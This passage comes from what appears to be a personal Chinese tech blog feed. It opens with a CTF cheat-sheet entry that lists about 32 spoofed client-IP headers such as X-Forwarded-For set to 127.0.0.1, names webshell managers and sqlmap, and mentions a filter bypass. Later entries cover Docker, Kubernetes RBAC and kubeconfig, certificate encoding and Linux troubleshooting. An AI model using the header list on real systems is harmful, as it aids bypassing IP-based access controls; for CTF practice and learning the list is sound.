class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">Client-IP: 127.0.0.1<br>Forwarded-For-Ip: 127.0.0.1<br>Forwarded-For: 127.0.0.1<br>Forwarded-For: localhost<br>Forwarded: 127.0.0.1<br>Forwarded: localhost<br>True-Client-IP: 127.0.0.1<br>X-Client-IP: 127.0.0.1<br>X-Custom-IP-Authorization: 127.0.0.1<br>X-Forward-For: 127.0.0.1<br>X-Forward: 127.0.0.1<br>X-Forward: localhost<br>X-Forwarded-By: 127.0.0.1<br>X-Forwarded-By: localhost<br>X-Forwarded-For-Original: 127.0.0.1<br>X-Forwarded-For-original: localhost<br>X-Forwarded-For: 127.0.0.1<br>X-Forwarded-For: localhost<br>X-Forwarded-Server: 127.0.0.1<br>X-Forwarded-Server: localhost<br>X-Forwarded: 127.0.0.1<br>X-Forwarded: localhost<br>X-Forwared-Host: 127.0.0.1<br>X-Forwared-Host: localhost<br>X-Host: 127.0.0.1<br>X-Host: localhost<br>X-HTTP-Host-Override: 127.0.0.1<br>X-Originating-IP: 127.0.0.1<br>X-Real-IP: 127.0.0.1<br>X-Remote-Addr: 127.0.0.1<br>X-Remote-Addr: localhost<br>X-Remote-IP: 127.0.0.1<br></code></pre></td></tr></table></figure><h2 id="webshell管理工具"><a href="#webshell管理工具" class="headerlink" title="webshell管理工具"></a>webshell管理工具</h2><p>一句话木马</p><p>蚁剑、冰蝎、哥斯拉<br>浏览器：about:config</p><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>sql注入<br>用于探测目标是否存在sql注入</p><h2 id="hackbar-1"><a href="#hackbar-1" class="headerlink" title="hackbar"></a>hackbar</h2><p>双写绕过</p><p>view-source:<a href="http://a.y1ng.vip:1126/robots/robots.txt">http://a.y1ng.vip:1126/robots/robots.txt</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【linux系列】(202307) 常用命令：证书相关</title>
    <link href="/2023/07/17/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202307)%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%9A%E8%AF%81%E4%B9%A6%E7%9B%B8%E5%85%B3/"/>
    <url>/2023/07/17/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202307)%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%9A%E8%AF%81%E4%B9%A6%E7%9B%B8%E5%85%B3/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">base64</span>参数：<br>       -w, --wrap=COLS<br>              wrap encoded lines after COLS character (default 76).  Use 0 to <span class="hljs-built_in">disable</span> line wrapping<br><br><br><span class="hljs-built_in">cat</span> ca.pem | <span class="hljs-built_in">base64</span> -w 0<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># cat ca.pem | base64 </span><br>LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURlakNDQW1LZ0F3SUJBZ0lVYnFnYm5MVnVi<br>NHNwTjJqS0xOY245d1QrVlhRd0RRWUpLb1pJaHZjTkFRRUwKQlFBd1F6RUxNQWtHQTFVRUJoTUNR<br>MDR4RURBT0JnTlZCQWdUQjBKbGFXcHBibWN4RURBT0JnTlZCQWNUQjBKbAphV3BwYm1jeEVEQU9C<br>Z05WQkFNVEIyVjBZMlFnUTBFd0hoY05NakF4TWpNd01EYzBPVEF3V2hjTk1qVXhNakk1Ck1EYzBP<br>VEF3V2pCRE1Rc3dDUVlEVlFRR0V3SkRUakVRTUE0R0ExVUVDQk1IUW1WcGFtbHVaekVRTUE0R0Ex<br>VUUKQnhNSFFtVnBhbWx1WnpFUU1BNEdBMVVFQXhNSFpYUmpaQ0JEUVRDQ0FTSXdEUVlKS29aSWh2<br>Y05BUUVCQlFBRApnZ0VQQURDQ0FRb0NnZ0VCQUo1YzZKMWpMb3d6L1E4Z2VsNGp1dDZ2TzRzOE1B<br>bnZnVmlJbE5YQXlHb1JvN1IvCm44c3hhWU4vdHM1eUhYN0NVNDlaaFVPeGQ0MU1BdUJmdVVGZCtr<br>VVI4a0o1b3RScEFlN1FTUXFKNEt4MnZqY0cKdXF0RldGTGMyUTFQUjM3NTFjQVBqYmVGd1gwbTFx<br>OFhYUHdqaWczVWVRaTFhdjM3VmVOVzhpS3FzOVpBUThtVwpWUTQyY2VFd0s4TzZSenFINllNRlI2<br>QkVlRS8yMnpsaE1OcmRsc1E5QjdQQkdzM2pXbEhsalowTHlyeU1NQTl5CldpMFJCelhoWVhMcDcy<br>VktsaU5LSzJLdWFVZ1FPdVpHUEY3YUVJYmR5bzBlY3RYMUo2YzBVZ1pxSVlTMkhzRUgKSTAweHZV<br>RS9lVHhsdXk4dy9IT3Vsc01KcVBsNVNXWXhPd3lFM1kwQ0F3RUFBYU5tTUdRd0RnWURWUjBQQVFI<br>LwpCQVFEQWdFR01CSUdBMVVkRXdFQi93UUlNQVlCQWY4Q0FRSXdIUVlEVlIwT0JCWUVGTW1Gei9j<br>b2VzSWdsbTZHCkd2SUdvejBnU0NPUU1COEdBMVVkSXdRWU1CYUFGTW1Gei9jb2VzSWdsbTZHR3ZJ<br>R296MGdTQ09RTUEwR0NTcUcKU0liM0RRRUJDd1VBQTRJQkFRQVlBMEh1K0MyRWN1WXFxcDdQZGt2<br>MHc4SklGMTRTQWJVVVFVcHFtZVhuUmZIVgpOOVZhM3pUMUEyalE1clNadXBCTDMzUzZTVStheU9w<br>dkxNKzIzMzR3SkdFNXRaVE9ZZ2E3OXZ5R3VoL1cxcTFsCksvUkhGQi9SZllLUitOT2pGRGk4bzdH<br>d3RrTzFqZWVnZnJxWEFXNzdhRVAxTmRsNlBVbTk1YStQc1VVVGdzaXQKN2ZNbjBPRmdXQ09xNkRH<br>dWNQM1RIYWx6N3RGVytPUjVjWloxWExqa1JWRFNFR0ZSVnJTV1MrZzVjaG1ma3V6bwo0R0pDNCti<br>eGRnanpuQWlhdlVsQkNnSWMwU2pabVFUeHFGcUhkbVprbVJjVkQwekJpVlFmd0Z6TSs3RUZycUJ1<br>CjJiOVVxdkJQZkk4cTA0Y3FTYmh4elFqcTE1T1lOdklJMDNnMVl6RmEKLS0tLS1FTkQgQ0VSVElG<br>SUNBVEUtLS0tLQo=<br><br><br><span class="hljs-comment"># cat ca.pem | base64 -w 0</span><br>LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURlakNDQW1LZ0F3SUJBZ0lVYnFnYm5MVnViNHNwTjJqS0xOY245d1QrVlhRd0RRWUpLb1pJaHZjTkFRRUwKQlFBd1F6RUxNQWtHQTFVRUJoTUNRMDR4RURBT0JnTlZCQWdUQjBKbGFXcHBibWN4RURBT0JnTlZCQWNUQjBKbAphV3BwYm1jeEVEQU9CZ05WQkFNVEIyVjBZMlFnUTBFd0hoY05NakF4TWpNd01EYzBPVEF3V2hjTk1qVXhNakk1Ck1EYzBPVEF3V2pCRE1Rc3dDUVlEVlFRR0V3SkRUakVRTUE0R0ExVUVDQk1IUW1WcGFtbHVaekVRTUE0R0ExVUUKQnhNSFFtVnBhbWx1WnpFUU1BNEdBMVVFQXhNSFpYUmpaQ0JEUVRDQ0FTSXdEUVlKS29aSWh2Y05BUUVCQlFBRApnZ0VQQURDQ0FRb0NnZ0VCQUo1YzZKMWpMb3d6L1E4Z2VsNGp1dDZ2TzRzOE1BbnZnVmlJbE5YQXlHb1JvN1IvCm44c3hhWU4vdHM1eUhYN0NVNDlaaFVPeGQ0MU1BdUJmdVVGZCtrVVI4a0o1b3RScEFlN1FTUXFKNEt4MnZqY0cKdXF0RldGTGMyUTFQUjM3NTFjQVBqYmVGd1gwbTFxOFhYUHdqaWczVWVRaTFhdjM3VmVOVzhpS3FzOVpBUThtVwpWUTQyY2VFd0s4TzZSenFINllNRlI2QkVlRS8yMnpsaE1OcmRsc1E5QjdQQkdzM2pXbEhsalowTHlyeU1NQTl5CldpMFJCelhoWVhMcDcyVktsaU5LSzJLdWFVZ1FPdVpHUEY3YUVJYmR5bzBlY3RYMUo2YzBVZ1pxSVlTMkhzRUgKSTAweHZVRS9lVHhsdXk4dy9IT3Vsc01KcVBsNVNXWXhPd3lFM1kwQ0F3RUFBYU5tTUdRd0RnWURWUjBQQVFILwpCQVFEQWdFR01CSUdBMVVkRXdFQi93UUlNQVlCQWY4Q0FRSXdIUVlEVlIwT0JCWUVGTW1Gei9jb2VzSWdsbTZHCkd2SUdvejBnU0NPUU1COEdBMVVkSXdRWU1CYUFGTW1Gei9jb2VzSWdsbTZHR3ZJR296MGdTQ09RTUEwR0NTcUcKU0liM0RRRUJDd1VBQTRJQkFRQVlBMEh1K0MyRWN1WXFxcDdQZGt2MHc4SklGMTRTQWJVVVFVcHFtZVhuUmZIVgpOOVZhM3pUMUEyalE1clNadXBCTDMzUzZTVStheU9wdkxNKzIzMzR3SkdFNXRaVE9ZZ2E3OXZ5R3VoL1cxcTFsCksvUkhGQi9SZllLUitOT2pGRGk4bzdHd3RrTzFqZWVnZnJxWEFXNzdhRVAxTmRsNlBVbTk1YStQc1VVVGdzaXQKN2ZNbjBPRmdXQ09xNkRHdWNQM1RIYWx6N3RGVytPUjVjWloxWExqa1JWRFNFR0ZSVnJTV1MrZzVjaG1ma3V6bwo0R0pDNCtieGRnanpuQWlhdlVsQkNnSWMwU2pabVFUeHFGcUhkbVprbVJjVkQwekJpVlFmd0Z6TSs3RUZycUJ1CjJiOVVxdkJQZkk4cTA0Y3FTYmh4elFqcTE1T1lOdklJMDNnMVl6RmEKLS0tLS1FTkQgQ0VSVElGSUNBVEUtLS0tLQo=<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【docker系列】(202307) 构建dashboard的arm镜像</title>
    <link href="/2023/07/13/docker/%E3%80%90docker%E7%B3%BB%E5%88%97%E3%80%91(202307)%20%E6%9E%84%E5%BB%BAdashboard%E7%9A%84arm%E9%95%9C%E5%83%8F/"/>
    <url>/2023/07/13/docker/%E3%80%90docker%E7%B3%BB%E5%88%97%E3%80%91(202307)%20%E6%9E%84%E5%BB%BAdashboard%E7%9A%84arm%E9%95%9C%E5%83%8F/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">############################ 1.下载仓库 ############################</span><br>[root@ningan ~]<span class="hljs-comment"># pwd</span><br>/root<br><br>[root@ningan ~]<span class="hljs-comment"># git clone https://github.com/kubernetes/dashboard.git</span><br>Cloning into <span class="hljs-string">&#x27;dashboard&#x27;</span>...<br>remote: Enumerating objects: 95919, <span class="hljs-keyword">done</span>.<br>remote: Counting objects: 100% (445/445), <span class="hljs-keyword">done</span>.<br>remote: Compressing objects: 100% (167/167), <span class="hljs-keyword">done</span>.<br>remote: Total 95919 (delta 307), reused 401 (delta 274), pack-reused 95474<br>Receiving objects: 100% (95919/95919), 183.17 MiB | 5.84 MiB/s, <span class="hljs-keyword">done</span>.<br>Resolving deltas: 100% (56815/56815), <span class="hljs-keyword">done</span>.<br><br><span class="hljs-comment">############################ 2.找到main函数 ############################</span><br>[root@ningan ~]<span class="hljs-comment"># cd dashboard</span><br><br>[root@ningan dashboard]<span class="hljs-comment"># git checkout v2.4.0</span><br>Note: checking out <span class="hljs-string">&#x27;v2.4.0&#x27;</span>.<br><br>You are <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;detached HEAD&#x27;</span> state. You can look around, make experimental<br>changes and commit them, and you can discard any commits you make <span class="hljs-keyword">in</span> this<br>state without impacting any branches by performing another checkout.<br><br>If you want to create a new branch to retain commits you create, you may<br><span class="hljs-keyword">do</span> so (now or later) by using -b with the checkout <span class="hljs-built_in">command</span> again. Example:<br><br>  git checkout -b &lt;new-branch-name&gt;<br><br>HEAD is now at e75ebcf68 Prepare <span class="hljs-keyword">for</span> v2.4.0 release (<span class="hljs-comment">#6536)</span><br><br>[root@ningan dashboard]<span class="hljs-comment"># ls</span><br>aio           code-of-conduct.md  cypress       docs    go.sum             i18n     license-checker-config.json  OWNERS_ALIASES  package-lock.json  ROLES.md           SECURITY.md  tsconfig.json<br>angular.json  CONTRIBUTING.md     cypress.json  go.mod  gulpfile.babel.js  LICENSE  OWNERS                       package.json    README.md          SECURITY_CONTACTS  src<br>[root@ningan dashboard]<span class="hljs-comment">#</span><br>[root@ningan dashboard]<span class="hljs-comment"># cd src</span><br>[root@ningan src]<span class="hljs-comment"># ls</span><br>app<br>[root@ningan src]<span class="hljs-comment"># cd app/</span><br>[root@ningan app]<span class="hljs-comment"># ls</span><br>backend  frontend<br>[root@ningan app]<span class="hljs-comment"># cd backend/</span><br>[root@ningan backend]<span class="hljs-comment"># ls</span><br>api  args  auth  cert  client  dashboard.go  errors  handler  integration  plugin  resource  scaling  settings  <span class="hljs-built_in">sync</span>  systembanner  validation<br>[root@ningan backend]<span class="hljs-comment">#</span><br><br><br><span class="hljs-comment">############################ 3.编译arm二进制 ############################</span><br>[root@ningan backend]<span class="hljs-comment"># GOOS=linux GOARCH=arm64 go build  -o bin/dashboard-arm ./dashboard.go</span><br>[root@ningan backend]<span class="hljs-comment">#</span><br>[root@ningan backend]<span class="hljs-comment"># cd bin</span><br>[root@ningan bin]<span class="hljs-comment"># ll</span><br>total 49880<br>drwxr-xr-x  2 root root     4096 Jul 13 15:36 ./<br>drwxr-xr-x 18 root root     4096 Jul 13 15:36 ../<br>-rwxr-xr-x  1 root root 51063857 Jul 13 15:36 dashboard-arm*<br><br><br><span class="hljs-comment">############################ 4.编写Dockerfile ############################</span><br>[root@ningan bin]<span class="hljs-comment"># cat Dockerfilearm</span><br>FROM xxx   <span class="hljs-comment"># 此处写成自己的一个arm基础镜像</span><br><br>ADD ./dashboard-arm /dashboard<br>USER root<br>EXPOSE 8443 9090<br>ENTRYPOINT [<span class="hljs-string">&quot;/dashboard&quot;</span>]<br><br><span class="hljs-comment">############################ 5.构建镜像 ############################</span><br>[root@ningan bin]<span class="hljs-comment"># docker build -t dashboard:v2.4.0-arm64 . -f Dockerfilearm</span><br>Sending build context to Docker daemon  51.07MB<br>Step 1/5 : FROM xxx/istio/csm_stg/src_image_build/base_go:1.16<br> ---&gt; 3ad4565d534b<br>Step 2/5 : ADD ./dashboard-arm /dashboard<br> ---&gt; 7e3d77933b5a<br>Step 3/5 : USER root<br> ---&gt; [Warning] The requested image<span class="hljs-string">&#x27;s platform (linux/arm64/v8) does not match the detected host platform (linux/amd64) and no specific platform was requested</span><br><span class="hljs-string"> ---&gt; Running in 2d9408e745f1</span><br><span class="hljs-string">Removing intermediate container 2d9408e745f1</span><br><span class="hljs-string"> ---&gt; 177800207a1e</span><br><span class="hljs-string">Step 4/5 : EXPOSE 8443 9090</span><br><span class="hljs-string"> ---&gt; [Warning] The requested image&#x27;</span>s platform (linux/arm64/v8) does not match the detected host platform (linux/amd64) and no specific platform was requested<br> ---&gt; Running <span class="hljs-keyword">in</span> 932853d116b3<br>Removing intermediate container 932853d116b3<br> ---&gt; 7ea9c1c8d5e5<br>Step 5/5 : ENTRYPOINT [<span class="hljs-string">&quot;/dashboard&quot;</span>]<br> ---&gt; [Warning] The requested image<span class="hljs-string">&#x27;s platform (linux/arm64/v8) does not match the detected host platform (linux/amd64) and no specific platform was requested</span><br><span class="hljs-string"> ---&gt; Running in ce7ee0cc5586</span><br><span class="hljs-string">Removing intermediate container ce7ee0cc5586</span><br><span class="hljs-string"> ---&gt; e14cdf3553f3</span><br><span class="hljs-string">Successfully built e14cdf3553f3</span><br><span class="hljs-string">Successfully tagged dashboard:v2.4.0-arm64</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">############################ 6.测试 ############################</span><br><span class="hljs-string">启动是可以成功启动了，但是一直重启，也不知道为啥</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【k8s系列】(202307) kubeconfig指定ns</title>
    <link href="/2023/07/07/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202307)%20kubeconfig%E6%8C%87%E5%AE%9Ans/"/>
    <url>/2023/07/07/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202307)%20kubeconfig%E6%8C%87%E5%AE%9Ans/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">apiVersion: v1<br>clusters:<br>- cluster:<br>    certificate-authority-data: xxxx<br>    server: xxx<br>  name: kubernetes<br>contexts:<br>- context:<br>    cluster: kubernetes<br>    user: system:admin<br>    namespace: default             <span class="hljs-comment">### 在此处添加</span><br>  name: system:admin<br>current-context: system:admin<br>kind: Config<br>preferences: &#123;&#125;<br><span class="hljs-built_in">users</span>:<br>- name: system:admin<br>  user:<br>    client-certificate-data: xxx<br>    client-key-data: xxx<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【k8s系列】(202307) 创建一个限定ns的最大权限</title>
    <link href="/2023/07/07/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202307)%20%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E9%99%90%E5%AE%9Ans%E7%9A%84%E6%9C%80%E5%A4%A7%E6%9D%83%E9%99%90/"/>
    <url>/2023/07/07/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202307)%20%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E9%99%90%E5%AE%9Ans%E7%9A%84%E6%9C%80%E5%A4%A7%E6%9D%83%E9%99%90/</url>
    
    <content type="html"><![CDATA[<p>绑到cluster-admin上面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># kubectl get clusterrole -A |grep admin</span><br>admin                                                                  2023-06-14T09:22:20Z<br>cluster-admin                                                          2023-06-14T09:22:20Z<br>system:aggregate-to-admin                                              2023-06-14T09:22:20Z<br>system:kubelet-api-admin                                               2023-06-14T09:22:20Z<br><br><br><br><span class="hljs-comment"># kubectl create rolebinding  xxx --clusterrole=cluster-admin --serviceaccount=xx --namespace=xx</span><br>rolebinding.rbac.authorization.k8s.io/xx created<br><br></code></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/aresxin/p/k8s-sc.html">K8S权限控制，限制用户在多个namespace上的访问权限</a><br><a href="https://juejin.cn/post/7221147640491098169"># Kubernetes 如何限制不同的团队只能访问各自的 namespace？</a></p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【containerd错误解决系列】(202307)uos arm主机docker及containerd都拉不下来镜像</title>
    <link href="/2023/07/07/k8s/%E3%80%90containerd%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3%E7%B3%BB%E5%88%97%E3%80%91(202307)uos%20arm%E4%B8%BB%E6%9C%BAdocker%E5%8F%8Acontainerd%E9%83%BD%E6%8B%89%E4%B8%8D%E4%B8%8B%E6%9D%A5%E9%95%9C%E5%83%8F/"/>
    <url>/2023/07/07/k8s/%E3%80%90containerd%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3%E7%B3%BB%E5%88%97%E3%80%91(202307)uos%20arm%E4%B8%BB%E6%9C%BAdocker%E5%8F%8Acontainerd%E9%83%BD%E6%8B%89%E4%B8%8D%E4%B8%8B%E6%9D%A5%E9%95%9C%E5%83%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># top</span><br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230707101601.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># pstree -sp  27057</span><br>systemd(1)─┬─NetworkManager(2023)─┬─&#123;NetworkManager&#125;(2024)<br>           │                      └─&#123;NetworkManager&#125;(2025)<br>           ├─agetty(2742)<br>           ├─atd(2721)<br>           ├─avahi-daemon(1535)───avahi-daemon(1963)<br>           ├─chronyd(1616)<br>           ├─crond(2717)<br>           ├─cupsd(2446)<br>           ├─dbus-daemon(1524)<br>           ├─dhclient(2644)<br>           ├─dockerd(26518)─┬─containerd(26544)─┬─&#123;containerd&#125;(26545)<br>           │                │                   ├─&#123;containerd&#125;(26546)<br>           │                │                   ├─&#123;containerd&#125;(26547)<br>...<br>           │                ├─exe(27059)─┬─&#123;exe&#125;(27063)<br>           │                │            ├─&#123;exe&#125;(27064)<br>           │                │            ├─&#123;exe&#125;(27065)<br>...<br>           │                ├─unpigz(27057)─┬─&#123;unpigz&#125;(27060)<br>           │                │               ├─&#123;unpigz&#125;(27061)<br>           │                │               └─&#123;unpigz&#125;(27062)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># kill -9 27057</span><br><span class="hljs-comment"># docker pull xxx</span><br>xxx: Pulling from xxx<br>0ce1dd7918a4: Extracting [&gt;                                                  ]  32.77kB/2.827MB<br>c3268f83bb2a: Download complete <br>d9df37ecafc7: Download complete <br>58314a0280f3: Download complete <br>1374301702f0: Download complete <br>de4ca8f4f0e5: Download complete <br>0324a5263b9e: Verifying Checksum <br>f2c38dbf6aeb: Download complete <br>b991a5cc3e08: Download complete <br>5bd991751008: Download complete <br>4f4fb700ef54: Download complete <br>16f345ae53d4: Download complete <br>0f91d7e86c83: Download complete <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># rpm -qf /bin/unpigz</span><br>pigz-2.4-7.uelc20.01.aarch64<br><br><span class="hljs-comment"># yum remove pigz</span><br><span class="hljs-comment"># rpm -qf /bin/unpigz</span><br>error: file /bin/unpigz: No such file or directory<br><br><br>docker pull xxx<br>crictl pull xxx<br></code></pre></td></tr></table></figure><p>删除了这个包就可以了，具体说明参考下面的文档</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/alex_yangchuansheng/article/details/130278731">解决国产系统 Docker 拉取大镜像卡顿之谜</a></p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【虚拟机】hyper-v中ubuntu18.04开机卡在启动界面</title>
    <link href="/2023/06/30/net/%E3%80%90%E8%99%9A%E6%8B%9F%E6%9C%BA%E3%80%91hyper-v%E4%B8%ADubuntu18.04%E5%BC%80%E6%9C%BA%E5%8D%A1%E5%9C%A8%E5%90%AF%E5%8A%A8%E7%95%8C%E9%9D%A2/"/>
    <url>/2023/06/30/net/%E3%80%90%E8%99%9A%E6%8B%9F%E6%9C%BA%E3%80%91hyper-v%E4%B8%ADubuntu18.04%E5%BC%80%E6%9C%BA%E5%8D%A1%E5%9C%A8%E5%90%AF%E5%8A%A8%E7%95%8C%E9%9D%A2/</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230630012815.png" alt="image.png"></p><p>Alt + F2  或者 Alt + Fn + F2</p><p>进去删几个大文件就可以啦~</p><p><a href="https://askubuntu.com/questions/1033613/start-job-is-running-for-hold-until-boot-process-finishes-up-18-04"># <a href="https://askubuntu.com/questions/1033613/start-job-is-running-for-hold-until-boot-process-finishes-up-18-04">Start job is running for hold until boot process finishes up 18.04</a></a></p>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【网络成长记】常见网络包</title>
    <link href="/2023/06/19/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91%E5%B8%B8%E8%A7%81%E7%BD%91%E7%BB%9C%E5%8C%85/"/>
    <url>/2023/06/19/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91%E5%B8%B8%E8%A7%81%E7%BD%91%E7%BB%9C%E5%8C%85/</url>
    
